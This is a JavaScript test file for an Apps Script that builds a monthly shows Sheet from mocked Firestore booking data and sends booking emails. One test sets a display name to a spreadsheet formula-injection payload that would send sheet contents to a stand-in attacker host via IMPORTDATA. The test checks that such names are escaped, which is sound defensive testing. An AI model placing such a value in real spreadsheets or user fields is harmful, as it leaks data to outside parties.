const fs = require("fs");
// Offline test of apps-script/shows/Code.gs (Shows Sheet + booking emails) against a mock Sheet + Firestore.
// Run: node tests/shows_sync.test.cjs
const src = fs.readFileSync(require("path").join(__dirname, "../apps-script/shows/Code.gs"), "utf8");
// ---------- mock Sheets ----------
const colNum = s => s.split("").reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);
function a1(s) { const [p, q] = s.split(":"); const f = x => { const m = /^([A-Z]+)(\d+)$/.exec(x); return [+m[2], colNum(m[1])]; };
  const [r1, c1] = f(p), [r2, c2] = q ? f(q) : [r1, c1]; return [r1, c1, r2 - r1 + 1, c2 - c1 + 1]; }
class Sheet {
  constructor(name) { this.name = name; this.v = {}; this.bg = {}; this.fc = {}; this.notes = {}; this.maxCols = 26; this.maxRows = 1000; }
  clear() { this.v = {}; this.bg = {}; this.fc = {}; } hideSheet() { this.hidden = true; } getMaxRows() { return this.maxRows; } insertRowsAfter(a, n) { this.maxRows += n; }
  getName() { return this.name; }
  key(r, c) { return r + "," + c; }
  getRange(r, c, nr, nc) { if (typeof r === "string") [r, c, nr, nc] = a1(r); return new Range(this, r, c, nr || 1, nc || 1); }
  getLastRow() { let m = 0; for (const k in this.v) { if (this.v[k] !== "" && this.v[k] !== null && this.v[k] !== undefined) m = Math.max(m, +k.split(",")[0]); } return m; }
  getMaxColumns() { return this.maxCols; } insertColumnsAfter(a, n) { this.maxCols += n; }
  setColumnWidth() {} setColumnWidths() {} hideColumns() {} setFrozenRows() {} setFrozenColumns() {}
  getActiveRangeList() { return { getRanges: () => this.sel || [] }; }
}
class Range {
  constructor(sh, r, c, nr, nc) { Object.assign(this, { sh, r, c, nr, nc }); const px = new Proxy(this, { get: (t, p) => p in t ? (typeof t[p] === "function" ? (...a) => { const out = t[p](...a); return out === t ? px : out; } : t[p]) : () => px }); return px; }
  cells(fn) { const out = []; for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) row.push(fn(this.r + i, this.c + j, i, j)); out.push(row); } return out; }
  getValues() { return this.cells((r, c) => { const v = this.sh.v[this.sh.key(r, c)]; return v === undefined ? "" : v; }); }
  setValues(vs) { this.cells((r, c, i, j) => { this.sh.v[this.sh.key(r, c)] = vs[i][j]; }); return this; }
  setValue(v) { this.sh.v[this.sh.key(this.r, this.c)] = v; return this; }
  getBackgrounds() { return this.cells((r, c) => this.sh.bg[this.sh.key(r, c)] || "#ffffff"); }
  setBackgrounds(bs) { this.cells((r, c, i, j) => { this.sh.bg[this.sh.key(r, c)] = bs[i][j] || null; }); return this; }
  getNotes() { return this.cells((r, c) => this.sh.notes[this.sh.key(r, c)] || ""); }
  setNotes(ns) { this.cells((r, c, i, j) => { this.sh.notes[this.sh.key(r, c)] = ns[i][j]; }); this.sh.noteWrites = (this.sh.noteWrites || 0) + 1; return this; }
  setFontColors(fs) { this.cells((r, c, i, j) => { this.sh.fc[this.sh.key(r, c)] = fs[i][j]; }); return this; }
  setBackground(b) { this.cells((r, c) => { this.sh.bg[this.sh.key(r, c)] = b; }); return this; }
  insertCheckboxes() { this.cells((r, c) => { this.sh.v[this.sh.key(r, c)] = false; }); return this; }
  getRow() { return this.r; } getColumn() { return this.c; } getLastRow() { return this.r + this.nr - 1; } getLastColumn() { return this.c + this.nc - 1; }
}
const showSheets = [];
const SHOWS = { getSheetByName: n => showSheets.find(s => s.name === n) || null, insertSheet: n => { const s = new Sheet(n); showSheets.push(s); return s; } };
// ---------- mock Firestore over UrlFetchApp ----------
const db = { users: {}, avail: {}, settings: {}, jobs: {}, peopleCopy: {}, availMonths: {} };
const enc = v => v === null || v === undefined ? { nullValue: null } : Array.isArray(v) ? { arrayValue: { values: v.map(enc) } } : typeof v === "boolean" ? { booleanValue: v }
  : typeof v === "number" ? { integerValue: String(v) } : typeof v === "object" ? { mapValue: { fields: Object.fromEntries(Object.entries(v).map(([k, x]) => [k, enc(x)])) } } : { stringValue: String(v) };
const resp = (code, body) => ({ getResponseCode: () => code, getContentText: () => JSON.stringify(body) });
const docOut = (col, id, d) => ({ name: `projects/p/databases/(default)/documents/${col}/${id}`, fields: Object.fromEntries(Object.entries(d).map(([k, v]) => [k, enc(v)])) });
let reads = 0;
const tokens = { tBoss: "co", tMember: "m1" };
const UrlFetchApp = { fetch(url, opt = {}) {
  if (url.includes("accounts:lookup")) { const uid = tokens[JSON.parse(opt.payload).idToken]; return uid ? resp(200, { users: [{ localId: uid, emailVerified: true }] }) : resp(400, {}); }
  const path = url.split("/documents")[1] || "";
  if (path.startsWith(":runQuery")) { const q = JSON.parse(opt.payload).structuredQuery; const col = q.from[0].collectionId;
    const fl = q.where.compositeFilter ? q.where.compositeFilter.filters : [q.where];
    const hit = d => fl.every(({ fieldFilter: f }) => f.op === "EQUAL" ? d[f.field.fieldPath] === f.value.stringValue
      : d[f.field.fieldPath] !== undefined && d[f.field.fieldPath] > f.value.stringValue);
    const out = Object.entries(db[col] || {}).filter(([, d]) => hit(d)); reads += Math.max(out.length, 1);
    return resp(200, out.length ? out.map(([id, d]) => ({ document: docOut(col, id, d) })) : [{ readTime: "x" }]); }
  const [p] = path.slice(1).split("?"); const [col, id] = p.split("/");
  if (!id) { const all = Object.entries(db[col] || {}); reads += Math.max(all.length, 1); return resp(200, { documents: all.map(([i, d]) => docOut(col, i, d)) }); }
  if ((opt.method || "get") !== "get") throw new Error("the shows script must never write to Firestore");
  reads++; const d = (db[col] || {})[id]; return d ? resp(200, docOut(col, id, d)) : resp(404, {});
} };
const mails = [];
const ctx = { SpreadsheetApp: { openById: () => SHOWS, getActiveSpreadsheet: () => SHOWS, BorderStyle: {} },
  UrlFetchApp, LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) }, ScriptApp: { getOAuthToken: () => "t" },
  Session: { getScriptTimeZone: () => "Asia/Singapore" }, Utilities: { formatDate: (d) => d.toDateString() },
  MailApp: { getRemainingDailyQuota: () => 100, sendEmail: m => mails.push(m) },
  ContentService: { createTextOutput: t => ({ setMimeType: () => JSON.parse(t) }), MimeType: {} }, console };
const load = () => new Function(...Object.keys(ctx), src + "\nreturn { doPost };")(...Object.values(ctx));
const post = (token, months, notices) => load().doPost({ postData: { contents: JSON.stringify({ action: "sync", idToken: token, months, notices }) } });
let pass = 0, fail = 0; const ok = (n, c) => { console.log((c ? "PASS " : "FAIL ") + n); c ? pass++ : fail++; };

// ---------- data ----------
const editPerm = { avail: { edit: true } };
db.users = { m1: { email: "m1@x.com", displayName: "Marcus", casualId: "SC0030", role: "Member", status: "active", perm: editPerm },
  co: { email: "co@x.com", displayName: "Farah", casualId: "SC0100", role: "Co-Admin", status: "active", perm: { avail: { edit: true, book: true } } },
  host: { email: "starpacsound.admin@showbase.local", role: "Member", status: "active", perm: editPerm, displayName: "Host-ish", casualId: "SC0001" } };
const M = "2026-11";
const av = (uid, name, casualId, avail, soft, conf) => { db.avail[`${uid}_${M}`] = { uid, month: M, name, casualId, avail, soft, conf, withdrawn: [], updatedAt: "2026-10-01T00:00:00Z" }; };
av("m1", "Marcus", "SC0030", ["03", "05", "10"], [], ["03", "05"]);
av("co", "Farah", "SC0100", ["03", "05", "06"], ["03"], ["06"]);
av("host", "Host-ish", "SC0001", ["03", "07"], [], ["03"]);
db.jobs.j1 = { kind: "show", date: "2026-11-06", month: M, title: "ABC Concert", start: "14:00", end: "17:00", venue: "LT1", crew: [{ uid: "co", role: "SE" }], crewUids: ["co"] };
db.jobs.j2 = { kind: "show", date: "2026-11-03", month: M, title: "XLOV", start: "08:00", end: "00:00", venue: "THT", manpower: [{ role: "ST", qty: 2 }, { role: "CRS", qty: 4 }],
  crew: [{ uid: "m1", name: "Marcus", role: "ST" }, { uid: "co", name: "Farah", role: "CRS" }], crewUids: ["m1", "co"] };
db.jobs.j3 = { kind: "maint", date: "2026-11-03", month: M, title: "Maintenance", start: "", end: "", venue: "", manpower: [], crew: [{ uid: "host", name: "Dol", role: "ST" }], crewUids: ["host"] };
db.jobs.j4 = { kind: "show", date: "2026-11-05", month: M, title: "Second Show", start: "19:00", end: "22:00", venue: "LOFT", manpower: [], crew: [{ uid: "m1", name: "Marcus", role: "SE" }], crewUids: ["m1"] };

// ---------- auth ----------
ok("unknown callers are refused", post("nope", [M]).ok === false && !showSheets.length);
// ---------- shows Sheet ----------
let out = post("tMember", [M]);
const ss2 = showSheets.find(x => x.name === "Nov 26");
ok("a save in the app rebuilds that month's Shows Sheet tab ('Nov 26')", out.ok && !!ss2);
const cellsOf = sht => Object.entries(sht.v).filter(([, v]) => v !== "" && v !== null);
const find = (sht, text) => (cellsOf(sht).find(([k, v]) => v === text && +k.split(",")[1] >= 3) || cellsOf(sht).find(([, v]) => v === text) || [])[0];
const findDay = (sht, text) => (cellsOf(sht).find(([k, v]) => v === text && +k.split(",")[1] >= 3) || [])[0];
const t = find(ss2, "XLOV");
ok("show block: name, time, manpower", t && (() => { const [r, c] = t.split(",").map(Number); return ss2.v[(r + 1) + "," + c] === "0800 - 0000" && ss2.v[(r + 2) + "," + c] === "2ST, 4CRS"; })());
ok("show block coloured by venue (THT red)", t && ss2.bg[t] === "#e06666");
const mk = findDay(ss2, "Marcus ST"), fa = findDay(ss2, "Farah CRS");
ok("crew listed as 'Name ROLE' under the show", !!mk && !!fa);
ok("confirmed crew cyan, soft crew yellow", ss2.bg[mk] === "#00ffff" && ss2.bg[fa] === "#ffff00");
ok("maintenance calls have no colour", ss2.bg[find(ss2, "Maintenance")] === "#ffffff");
ok("maintenance block at the bottom of the day", !!find(ss2, "Maintenance") && +find(ss2, "Maintenance").split(",")[0] > +mk.split(",")[0]);
const leftIds = sht => cellsOf(sht).filter(([k]) => +k.split(",")[1] === 2 && +k.split(",")[0] > 3).map(([, v]) => v);
ok("week list = members on a confirmed show that week, in ID order", !!find(ss2, "Week 1") && leftIds(ss2).includes("SC0030") && leftIds(ss2).includes("SC0100"));
ok("member on 2 shows in a week is listed once that week", leftIds(ss2).filter(x => x === "SC0030").length === 1 && !!findDay(ss2, "Marcus SE"));
db.jobs.j2.crew = db.jobs.j2.crew.filter(c => c.uid !== "co"); db.jobs.j2.crewUids = ["m1"];
post("tMember", [M]);
ok("removing someone in the app removes them from the shows Sheet", !findDay(ss2, "Farah CRS") && !!findDay(ss2, "Marcus ST"));
db.jobs.j2.start = "09:00"; post("tMember", [M]);
ok("show time change reflected", !!find(ss2, "0900 - 0000"));
db.users.m1.displayName = '=IMPORTDATA("https://evil.example/?"&A1)'; post("tMember", [M]);
ok("a name starting with = is written as text, not a formula", cellsOf(ss2).some(([, v]) => typeof v === "string" && v.startsWith("'=IMPORTDATA")) && !cellsOf(ss2).some(([, v]) => typeof v === "string" && v.startsWith("=")));
db.users.m1.displayName = "Marcus";

// venue groups: studio / gallery -> GAL/STU, theatre -> THT, terrace (or "terrance") -> TERRACE, loft -> LOFT
const vjob = (id, title, venue) => { db.jobs[id] = { kind: "show", date: "2026-11-12", month: M, title, start: "10:00", end: "12:00", venue, manpower: [], crew: [], crewUids: [] }; };
vjob("v1", "Studio Gig", "Black Box Studio"); vjob("v2", "Art Talk", "Main Gallery"); vjob("v3", "Big Play", "Drama Theater");
vjob("v4", "Sunset Set", "Rooftop Terrance"); vjob("v5", "Loft Jam", "The Loft"); vjob("v6", "Offsite", "Town Hall");
post("tMember", [M]);
const bgOf = title => ss2.bg[find(ss2, title)];
ok("venue groups: studio/gallery blue, theatre/theater red, terrace/terrance orange, loft green, others purple",
  bgOf("Studio Gig") === "#6d9eeb" && bgOf("Art Talk") === "#6d9eeb" && bgOf("Big Play") === "#e06666" && bgOf("Sunset Set") === "#f6b26b"
  && bgOf("Loft Jam") === "#93c47d" && bgOf("Offsite") === "#b4a7d6");
["v1", "v2", "v3", "v4", "v5", "v6"].forEach(id => delete db.jobs[id]);
post("tMember", [M]);

// ---------- booking emails ----------
db.settings.availability = { emailOnBooking: false };
post("tBoss", [M], [{ uid: "m1", month: M, day: 5, now: "C" }]);
ok("emails off -> none sent", mails.length === 0);
db.settings.availability = { emailOnBooking: true };
post("tBoss", [M], [{ uid: "m1", month: M, day: 5, now: "C" }]);
ok("booker confirms someone -> they get an email with the show details", mails.length === 1 && mails[0].to === "m1@x.com" && /Second Show, 1900-2200 @ LOFT \(you: SE\)/.test(mails[0].htmlBody));
post("tMember", [M], [{ uid: "co", month: M, day: 6, now: "C" }]);
ok("a member can't trigger emails to others", mails.length === 1);
post("tBoss", [M], [{ uid: "m1", month: M, day: 10, now: "C" }]);
ok("a notice that doesn't match what's saved is ignored", mails.length === 1);
post("tBoss", [M], [{ uid: "host", month: M, day: 3, now: "C" }]);
ok("username accounts are never emailed", mails.length === 1);
post("tBoss", [M], [{ uid: "co", month: M, day: 6, now: "C" }]);
ok("no email for the booker's own booking", mails.length === 1);
post("tBoss", [M], [{ uid: "m1", month: M, day: 10, now: "-" }]);
ok("cancelling a booking emails 'Booking cancelled'", mails.length === 2 && /Booking cancelled/.test(mails[1].htmlBody));

// ---------- reads: uses the app's saved copies ----------
for (let i = 0; i < 300; i++) db.users["p" + i] = { email: `p${i}@x.com`, displayName: "P" + i, casualId: "SC" + (2000 + i), role: "Member", status: "active", perm: editPerm, updatedAt: "2026-10-01T00:00:00Z" };
for (let i = 0; i < 300; i++) av("p" + i, "P" + i, "SC" + (2000 + i), ["01"], [], []);
reads = 0; post("tMember", [M]);
const noCopy = reads;
const active = Object.fromEntries(Object.entries(db.users).filter(([, u]) => u.status === "active"));
db.peopleCopy.active = { rows: active, mark: "2026-10-20T00:00:00Z", builtAt: "2026-10-20T00:00:00Z", n: Object.keys(active).length };
db.availMonths[M] = { month: M, rows: Object.fromEntries(Object.entries(db.avail).filter(([, d]) => d.month === M)), mark: "2026-10-20T00:00:00Z", builtAt: "2026-10-20T00:00:00Z", n: 1 };
reads = 0; post("tMember", [M]);
console.log(`  (reads per update: ${noCopy} without the app's saved copies, ${reads} with them; ${Object.keys(db.jobs).length} of those are the month's shows)`);
ok("with the app's saved copies an update costs a handful of reads + the month's shows", reads <= 6 + Object.keys(db.jobs).length && noCopy > 600);
db.avail[`p7_${M}`] = { ...db.avail[`p7_${M}`], conf: ["06"], avail: ["01", "06"], updatedAt: "2026-10-21T00:00:00Z" };
db.jobs.j1.crew.push({ uid: "p7", name: "P7", role: "ST" }); db.jobs.j1.crewUids.push("p7");
post("tMember", [M]);
ok("changes after the copy was saved are still picked up", !!findDay(ss2, "P7 ST"));

console.log(`\n${pass}/${pass + fail} shows Sheet checks passed`); process.exit(fail ? 1 : 0);
